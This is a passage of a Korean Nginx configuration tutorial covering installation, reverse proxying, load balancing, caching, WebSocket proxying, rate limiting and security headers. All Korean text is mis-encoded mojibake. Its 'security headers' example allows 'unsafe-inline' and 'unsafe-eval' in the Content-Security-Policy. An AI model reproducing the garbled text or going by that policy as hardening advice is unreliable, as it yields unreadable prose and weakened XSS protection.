ëŠ¥ë ¥ì„ ëª¨ë‘ í™œìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h2 id="Nginx-ì„¤ì¹˜"><a href="#Nginx-ì„¤ì¹˜" class="headerlink" title="Nginx ì„¤ì¹˜"></a>Nginx ì„¤ì¹˜</h2><h3 id="Ubuntu-Debian"><a href="#Ubuntu-Debian" class="headerlink" title="Ubuntu&#x2F;Debian"></a>Ubuntu&#x2F;Debian</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nginx ì‹œì‘</span></span><br><span class="line">sudo systemctl start nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># ë¶€íŒ… ì‹œ ìë™ ì‹œì‘ ì„¤ì •</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># ìƒíƒœ í™•ì¸</span></span><br><span class="line">sudo systemctl status nginx</span><br></pre></td></tr></table></figure><h3 id="CentOS-RHEL"><a href="#CentOS-RHEL" class="headerlink" title="CentOS&#x2F;RHEL"></a>CentOS&#x2F;RHEL</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install epel-release</span><br><span class="line">sudo yum install nginx</span><br><span class="line"></span><br><span class="line">sudo systemctl start nginx</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> nginx</span><br></pre></td></tr></table></figure><h3 id="macOS-Homebrew"><a href="#macOS-Homebrew" class="headerlink" title="macOS (Homebrew)"></a>macOS (Homebrew)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nginx ì‹œì‘</span></span><br><span class="line">brew services start nginx</span><br></pre></td></tr></table></figure><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 80:80 --name nginx nginx:latest</span><br></pre></td></tr></table></figure><h2 id="Nginx-ê¸°ë³¸-êµ¬ì¡°"><a href="#Nginx-ê¸°ë³¸-êµ¬ì¡°" class="headerlink" title="Nginx ê¸°ë³¸ êµ¬ì¡°"></a>Nginx ê¸°ë³¸ êµ¬ì¡°</h2><h3 id="ë””ë ‰í† ë¦¬-êµ¬ì¡°"><a href="#ë””ë ‰í† ë¦¬-êµ¬ì¡°" class="headerlink" title="ë””ë ‰í† ë¦¬ êµ¬ì¡°"></a>ë””ë ‰í† ë¦¬ êµ¬ì¡°</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/nginx/</span><br><span class="line">â”œâ”€â”€ nginx.conf              # ë©”ì¸ ì„¤ì • íŒŒì¼</span><br><span class="line">â”œâ”€â”€ sites-available/        # ì‚¬ìš© ê°€ëŠ¥í•œ ì‚¬ì´íŠ¸ ì„¤ì •</span><br><span class="line">â”œâ”€â”€ sites-enabled/          # í™œì„±í™”ëœ ì‚¬ì´íŠ¸ ì„¤ì • (ì‹¬ë³¼ë¦­ ë§í¬)</span><br><span class="line">â”œâ”€â”€ conf.d/                 # ì¶”ê°€ ì„¤ì • íŒŒì¼</span><br><span class="line">â”œâ”€â”€ snippets/               # ì¬ì‚¬ìš© ê°€ëŠ¥í•œ ì„¤ì • ì¡°ê°</span><br><span class="line">â””â”€â”€ modules-enabled/        # í™œì„±í™”ëœ ëª¨ë“ˆ</span><br><span class="line"></span><br><span class="line">/var/log/nginx/            # ë¡œê·¸ ë””ë ‰í† ë¦¬</span><br><span class="line">â”œâ”€â”€ access.log             # ì ‘ê·¼ ë¡œê·¸</span><br><span class="line">â””â”€â”€ error.log              # ì—ëŸ¬ ë¡œê·¸</span><br><span class="line"></span><br><span class="line">/var/www/html/             # ê¸°ë³¸ ì›¹ ë£¨íŠ¸ ë””ë ‰í† ë¦¬</span><br></pre></td></tr></table></figure><h3 id="nginx-conf-ê¸°ë³¸-êµ¬ì¡°"><a href="#nginx-conf-ê¸°ë³¸-êµ¬ì¡°" class="headerlink" title="nginx.conf ê¸°ë³¸ êµ¬ì¡°"></a>nginx.conf ê¸°ë³¸ êµ¬ì¡°</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì›Œì»¤ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰í•  ì‚¬ìš©ì</span></span><br><span class="line"><span class="attribute">user</span> www-data;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì›Œì»¤ í”„ë¡œì„¸ìŠ¤ ìˆ˜ (auto = CPU ì½”ì–´ ìˆ˜)</span></span><br><span class="line"><span class="attribute">worker_processes</span> auto;</span><br><span class="line"></span><br><span class="line"><span class="comment"># PID íŒŒì¼ ìœ„ì¹˜</span></span><br><span class="line"><span class="attribute">pid</span> /run/nginx.pid;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì´ë²¤íŠ¸ ë¸”ë¡: ì—°ê²° ì²˜ë¦¬ ë°©ì‹ ì„¤ì •</span></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="comment"># ì›Œì»¤ í”„ë¡œì„¸ìŠ¤ë‹¹ ìµœëŒ€ ë™ì‹œ ì—°ê²° ìˆ˜</span></span><br><span class="line">    <span class="attribute">worker_connections</span> <span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ì—°ê²° ì²˜ë¦¬ ë°©ë²• (epollì€ Linuxì—ì„œ íš¨ìœ¨ì )</span></span><br><span class="line">    <span class="attribute">use</span> <span class="literal">epoll</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTP ë¸”ë¡: ì›¹ ì„œë²„ ì„¤ì •</span></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="comment"># ê¸°ë³¸ ì„¤ì •</span></span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/mime.types;</span><br><span class="line">    <span class="attribute">default_type</span> application/octet-stream;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ë¡œê·¸ í˜•ì‹</span></span><br><span class="line">    <span class="attribute">log_format</span> main <span class="string">&#x27;<span class="variable">$remote_addr</span> - <span class="variable">$remote_user</span> [<span class="variable">$time_local</span>] &quot;<span class="variable">$request</span>&quot; &#x27;</span></span><br><span class="line">                    <span class="string">&#x27;<span class="variable">$status</span> <span class="variable">$body_bytes_sent</span> &quot;<span class="variable">$http_referer</span>&quot; &#x27;</span></span><br><span class="line">                    <span class="string">&#x27;&quot;<span class="variable">$http_user_agent</span>&quot; &quot;<span class="variable">$http_x_forwarded_for</span>&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ì ‘ê·¼ ë¡œê·¸ ì„¤ì •</span></span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/access.log main;</span><br><span class="line">    <span class="attribute">error_log</span> /var/log/nginx/<span class="literal">error</span>.log;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ì„±ëŠ¥ ìµœì í™”</span></span><br><span class="line">    <span class="attribute">sendfile</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">tcp_nopush</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">tcp_nodelay</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">keepalive_timeout</span> <span class="number">65</span>;</span><br><span class="line">    <span class="attribute">types_hash_max_size</span> <span class="number">2048</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Gzip ì••ì¶•</span></span><br><span class="line">    <span class="attribute">gzip</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">gzip_vary</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">gzip_proxied</span> any;</span><br><span class="line">    <span class="attribute">gzip_comp_level</span> <span class="number">6</span>;</span><br><span class="line">    <span class="attribute">gzip_types</span> text/plain text/css text/xml text/javascript</span><br><span class="line">               application/json application/javascript application/xml+rss;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ê°€ìƒ í˜¸ìŠ¤íŠ¸ ì„¤ì • í¬í•¨</span></span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/conf.d/<span class="regexp">*.conf</span>;</span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/sites-enabled/*;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="í•µì‹¬-ì„¤ì •-ê°€ì´ë“œ"><a href="#í•µì‹¬-ì„¤ì •-ê°€ì´ë“œ" class="headerlink" title="í•µì‹¬ ì„¤ì • ê°€ì´ë“œ"></a>í•µì‹¬ ì„¤ì • ê°€ì´ë“œ</h2><h3 id="1-ê¸°ë³¸-ì›¹-ì„œë²„-ì„¤ì •"><a href="#1-ê¸°ë³¸-ì›¹-ì„œë²„-ì„¤ì •" class="headerlink" title="1. ê¸°ë³¸ ì›¹ ì„œë²„ ì„¤ì •"></a>1. ê¸°ë³¸ ì›¹ ì„œë²„ ì„¤ì •</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="comment"># í¬íŠ¸ ì„¤ì •</span></span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">listen</span> [::]:<span class="number">80</span>;  <span class="comment"># IPv6</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ì„œë²„ ì´ë¦„ (ë„ë©”ì¸)</span></span><br><span class="line">    <span class="attribute">server_name</span> example.com www.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ë¬¸ì„œ ë£¨íŠ¸</span></span><br><span class="line">    <span class="attribute">root</span> /var/www/example.com;</span><br><span class="line">    <span class="attribute">index</span> index.html index.htm;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ë¡œê·¸ íŒŒì¼</span></span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/example.com.access.log;</span><br><span class="line">    <span class="attribute">error_log</span> /var/log/nginx/example.com.<span class="literal">error</span>.log;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ê¸°ë³¸ location ë¸”ë¡</span></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-HTTPS-SSL-ì„¤ì •"><a href="#2-HTTPS-SSL-ì„¤ì •" class="headerlink" title="2. HTTPS&#x2F;SSL ì„¤ì •"></a>2. HTTPS&#x2F;SSL ì„¤ì •</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">listen</span> [::]:<span class="number">443</span> ssl http2;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SSL ì¸ì¦ì„œ</span></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/nginx/ssl/example.com.crt;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/nginx/ssl/example.com.key;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SSL í”„ë¡œí† ì½œ ë° ì•”í˜¸í™”</span></span><br><span class="line">    <span class="attribute">ssl_protocols</span> TLSv1.<span class="number">2</span> TLSv1.<span class="number">3</span>;</span><br><span class="line">    <span class="attribute">ssl_ciphers</span> HIGH:!aNULL:!MD5;</span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SSL ì„¸ì…˜ ìºì‹œ</span></span><br><span class="line">    <span class="attribute">ssl_session_cache</span> shared:SSL:<span class="number">10m</span>;</span><br><span class="line">    <span class="attribute">ssl_session_timeout</span> <span class="number">10m</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># HSTS (HTTP Strict Transport Security)</span></span><br><span class="line">    <span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=31536000; includeSubDomains&quot;</span> always;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/example.com;</span><br><span class="line">    <span class="attribute">index</span> index.html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTPë¥¼ HTTPSë¡œ ë¦¬ë‹¤ì´ë ‰íŠ¸</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$server_name</span><span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-ë¦¬ë²„ìŠ¤-í”„ë¡ì‹œ-ì„¤ì •"><a href="#3-ë¦¬ë²„ìŠ¤-í”„ë¡ì‹œ-ì„¤ì •" class="headerlink" title="3. ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œ ì„¤ì •"></a>3. ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œ ì„¤ì •</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> api.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="comment"># ë°±ì—”ë“œ ì„œë²„ë¡œ í”„ë¡ì‹œ</span></span><br><span class="line">        <span class="attribute">proxy_pass</span> http://localhost:3000;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># í—¤ë” ì„¤ì •</span></span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># íƒ€ì„ì•„ì›ƒ ì„¤ì •</span></span><br><span class="line">        <span class="attribute">proxy_connect_timeout</span> <span class="number">60s</span>;</span><br><span class="line">        <span class="attribute">proxy_send_timeout</span> <span class="number">60s</span>;</span><br><span class="line">        <span class="attribute">proxy_read_timeout</span> <span class="number">60s</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ë²„í¼ ì„¤ì •</span></span><br><span class="line">        <span class="attribute">proxy_buffering</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">proxy_buffer_size</span> <span class="number">4k</span>;</span><br><span class="line">        <span class="attribute">proxy_buffers</span> <span class="number">8</span> <span class="number">4k</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-ë¡œë“œ-ë°¸ëŸ°ì‹±-ì„¤ì •"><a href="#4-ë¡œë“œ-ë°¸ëŸ°ì‹±-ì„¤ì •" class="headerlink" title="4. ë¡œë“œ ë°¸ëŸ°ì‹± ì„¤ì •"></a>4. ë¡œë“œ ë°¸ëŸ°ì‹± ì„¤ì •</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Upstream ë¸”ë¡: ë°±ì—”ë“œ ì„œë²„ ê·¸ë£¹ ì •ì˜</span></span><br><span class="line"><span class="section">upstream</span> backend &#123;</span><br><span class="line">    <span class="comment"># ë¡œë“œ ë°¸ëŸ°ì‹± ë°©ë²•</span></span><br><span class="line">    <span class="comment"># - ê¸°ë³¸: ë¼ìš´ë“œ ë¡œë¹ˆ</span></span><br><span class="line">    <span class="comment"># - least_conn: ìµœì†Œ ì—°ê²°</span></span><br><span class="line">    <span class="comment"># - ip_hash: í´ë¼ì´ì–¸íŠ¸ IP ê¸°ë°˜</span></span><br><span class="line">    <span class="comment"># - random: ëœë¤</span></span><br><span class="line">    least_conn;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ë°±ì—”ë“œ ì„œë²„ ëª©ë¡</span></span><br><span class="line">    <span class="attribute">server</span> backend1.example.com:<span class="number">8080</span> weight=<span class="number">3</span>;</span><br><span class="line">    <span class="attribute">server</span> backend2.example.com:<span class="number">8080</span> weight=<span class="number">2</span>;</span><br><span class="line">    <span class="attribute">server</span> backend3.example.com:<span class="number">8080</span> backup;  <span class="comment"># ë°±ì—… ì„œë²„</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># í—¬ìŠ¤ ì²´í¬ (Nginx Plus ê¸°ëŠ¥)</span></span><br><span class="line">    <span class="comment"># server backend4.example.com:8080 max_fails=3 fail_timeout=30s;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://backend;</span><br><span class="line">        <span class="attribute">proxy_next_upstream</span> <span class="literal">error</span> timeout invalid_header http_500;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ë¡œë“œ-ë°¸ëŸ°ì‹±-ì•Œê³ ë¦¬ì¦˜"><a href="#ë¡œë“œ-ë°¸ëŸ°ì‹±-ì•Œê³ ë¦¬ì¦˜" class="headerlink" title="ë¡œë“œ ë°¸ëŸ°ì‹± ì•Œê³ ë¦¬ì¦˜"></a>ë¡œë“œ ë°¸ëŸ°ì‹± ì•Œê³ ë¦¬ì¦˜</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. ë¼ìš´ë“œ ë¡œë¹ˆ (ê¸°ë³¸ê°’)</span></span><br><span class="line"><span class="section">upstream</span> backend &#123;</span><br><span class="line">    <span class="attribute">server</span> srv1.example.com;</span><br><span class="line">    <span class="attribute">server</span> srv2.example.com;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. ê°€ì¤‘ì¹˜ ê¸°ë°˜ ë¼ìš´ë“œ ë¡œë¹ˆ</span></span><br><span class="line"><span class="section">upstream</span> backend &#123;</span><br><span class="line">    <span class="attribute">server</span> srv1.example.com weight=<span class="number">3</span>;</span><br><span class="line">    <span class="attribute">server</span> srv2.example.com weight=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. ìµœì†Œ ì—°ê²°</span></span><br><span class="line"><span class="section">upstream</span> backend &#123;</span><br><span class="line">    least_conn;</span><br><span class="line">    <span class="attribute">server</span> srv1.example.com;</span><br><span class="line">    <span class="attribute">server</span> srv2.example.com;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. IP í•´ì‹œ (ì„¸ì…˜ ìœ ì§€)</span></span><br><span class="line"><span class="section">upstream</span> backend &#123;</span><br><span class="line">    ip_hash;</span><br><span class="line">    <span class="attribute">server</span> srv1.example.com;</span><br><span class="line">    <span class="attribute">server</span> srv2.example.com;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. ëœë¤</span></span><br><span class="line"><span class="section">upstream</span> backend &#123;</span><br><span class="line">    random;</span><br><span class="line">    <span class="attribute">server</span> srv1.example.com;</span><br><span class="line">    <span class="attribute">server</span> srv2.example.com;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-ì •ì -íŒŒì¼-ì„œë¹™-ìµœì í™”"><a href="#5-ì •ì -íŒŒì¼-ì„œë¹™-ìµœì í™”" class="headerlink" title="5. ì •ì  íŒŒì¼ ì„œë¹™ ìµœì í™”"></a>5. ì •ì  íŒŒì¼ ì„œë¹™ ìµœì í™”</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> static.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/static;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ì •ì  íŒŒì¼ ìºì‹±</span></span><br><span class="line">    <span class="section">location</span> <span class="regexp">~* \.(jpg|jpeg|png|gif|ico|css|js|svg|woff|woff2|ttf|eot)$</span> &#123;</span><br><span class="line">        <span class="attribute">expires</span> <span class="number">1y</span>;</span><br><span class="line">        <span class="attribute">add_header</span> Cache-Control <span class="string">&quot;public, immutable&quot;</span>;</span><br><span class="line">        <span class="attribute">access_log</span> <span class="literal">off</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Gzip ì••ì¶•</span></span><br><span class="line">    <span class="section">location</span> <span class="regexp">~* \.(css|js|json|xml)$</span> &#123;</span><br><span class="line">        <span class="attribute">gzip_static</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">expires</span> <span class="number">1y</span>;</span><br><span class="line">        <span class="attribute">add_header</span> Cache-Control <span class="string">&quot;public&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-ìºì‹±-ì„¤ì •"><a href="#6-ìºì‹±-ì„¤ì •" class="headerlink" title="6. ìºì‹± ì„¤ì •"></a>6. ìºì‹± ì„¤ì •</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ìºì‹œ ì¡´ ì •ì˜</span></span><br><span class="line"><span class="attribute">proxy_cache_path</span> /var/cache/nginx</span><br><span class="line">                 levels=<span class="number">1</span>:<span class="number">2</span></span><br><span class="line">                 keys_zone=my_cache:<span class="number">10m</span></span><br><span class="line">                 max_size=<span class="number">1g</span></span><br><span class="line">                 inactive=<span class="number">60m</span></span><br><span class="line">                 use_temp_path=<span class="literal">off</span>;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://backend;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ìºì‹œ í™œì„±í™”</span></span><br><span class="line">        <span class="attribute">proxy_cache</span> my_cache;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ìºì‹œ í‚¤</span></span><br><span class="line">        <span class="attribute">proxy_cache_key</span> <span class="string">&quot;<span class="variable">$scheme</span><span class="variable">$request_method</span><span class="variable">$host</span><span class="variable">$request_uri</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ìºì‹œ ìœ íš¨ ì‹œê°„</span></span><br><span class="line">        <span class="attribute">proxy_cache_valid</span> <span class="number">200</span> <span class="number">60m</span>;</span><br><span class="line">        <span class="attribute">proxy_cache_valid</span> <span class="number">404</span> <span class="number">10m</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ìºì‹œ ìš°íšŒ ì¡°ê±´</span></span><br><span class="line">        <span class="attribute">proxy_cache_bypass</span> <span class="variable">$cookie_nocache</span> <span class="variable">$arg_nocache</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ìºì‹œ ìƒíƒœ í—¤ë” ì¶”ê°€</span></span><br><span class="line">        <span class="attribute">add_header</span> X-Cache-Status <span class="variable">$upstream_cache_status</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-WebSocket-í”„ë¡ì‹œ"><a href="#7-WebSocket-í”„ë¡ì‹œ" class="headerlink" title="7. WebSocket í”„ë¡ì‹œ"></a>7. WebSocket í”„ë¡ì‹œ</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">map</span> <span class="variable">$http_upgrade</span> <span class="variable">$connection_upgrade</span> &#123;</span><br><span class="line">    <span class="attribute">default</span> upgrade;</span><br><span class="line">    &#x27;&#x27; close;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> ws.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> /ws &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://backend;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># WebSocket ì§€ì›</span></span><br><span class="line">        <span class="attribute">proxy_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Upgrade <span class="variable">$http_upgrade</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Connection <span class="variable">$connection_upgrade</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># íƒ€ì„ì•„ì›ƒ ì„¤ì • (WebSocketì€ ê¸´ ì—°ê²°)</span></span><br><span class="line">        <span class="attribute">proxy_read_timeout</span> <span class="number">3600s</span>;</span><br><span class="line">        <span class="attribute">proxy_send_timeout</span> <span class="number">3600s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-Rate-Limiting-ìš”ì²­-ì œí•œ"><a href="#8-Rate-Limiting-ìš”ì²­-ì œí•œ" class="headerlink" title="8. Rate Limiting (ìš”ì²­ ì œí•œ)"></a>8. Rate Limiting (ìš”ì²­ ì œí•œ)</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Zone ì •ì˜: ì´ˆë‹¹ 10ê°œ ìš”ì²­ìœ¼ë¡œ ì œí•œ</span></span><br><span class="line"><span class="attribute">limit_req_zone</span> <span class="variable">$binary_remote_addr</span> zone=mylimit:<span class="number">10m</span> rate=10r/s;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> /api/ &#123;</span><br><span class="line">        <span class="comment"># Rate limiting ì ìš©</span></span><br><span class="line">        <span class="attribute">limit_req</span> zone=mylimit burst=<span class="number">20</span> nodelay;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 429 ì—ëŸ¬ ì‹œ ì»¤ìŠ¤í…€ ì‘ë‹µ</span></span><br><span class="line">        <span class="attribute">limit_req_status</span> <span class="number">429</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">proxy_pass</span> http://backend;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-ë³´ì•ˆ-í—¤ë”-ì„¤ì •"><a href="#9-ë³´ì•ˆ-í—¤ë”-ì„¤ì •" class="headerlink" title="9. ë³´ì•ˆ í—¤ë” ì„¤ì •"></a>9. ë³´ì•ˆ í—¤ë” ì„¤ì •</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ë³´ì•ˆ í—¤ë”</span></span><br><span class="line">    <span class="attribute">add_header</span> X-Frame-Options <span class="string">&quot;SAMEORIGIN&quot;</span> always;</span><br><span class="line">    <span class="attribute">add_header</span> X-Content-Type-Options <span class="string">&quot;nosniff&quot;</span> always;</span><br><span class="line">    <span class="attribute">add_header</span> X-XSS-Protection <span class="string">&quot;1; mode=block&quot;</span> always;</span><br><span class="line">    <span class="attribute">add_header</span> Referrer-Policy <span class="string">&quot;no-referrer-when-downgrade&quot;</span> always;</span><br><span class="line">    <span class="attribute">add_header</span> Content-Security-Policy <span class="string">&quot;default-src &#x27;self&#x27; https: data: &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;;&quot;</span> always;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># HSTS</span></span><br><span class="line">    <span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=31536000; includeSubDomains; preload&quot;</span> always;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span> /var/www/example.com;</span><br><span class="line">        <span class="attribute">index</span> index.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-ë¦¬ë‹¤ì´ë ‰íŠ¸-ë°-Rewrite"><a href="#10-ë¦¬ë‹¤ì´ë ‰íŠ¸-ë°-Rewrite" class="headerlink" title="10. ë¦¬ë‹¤ì´ë ‰íŠ¸ ë° Rewrite"></a>10. ë¦¬ë‹¤ì´ë ‰íŠ¸ ë° Rewrite</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span 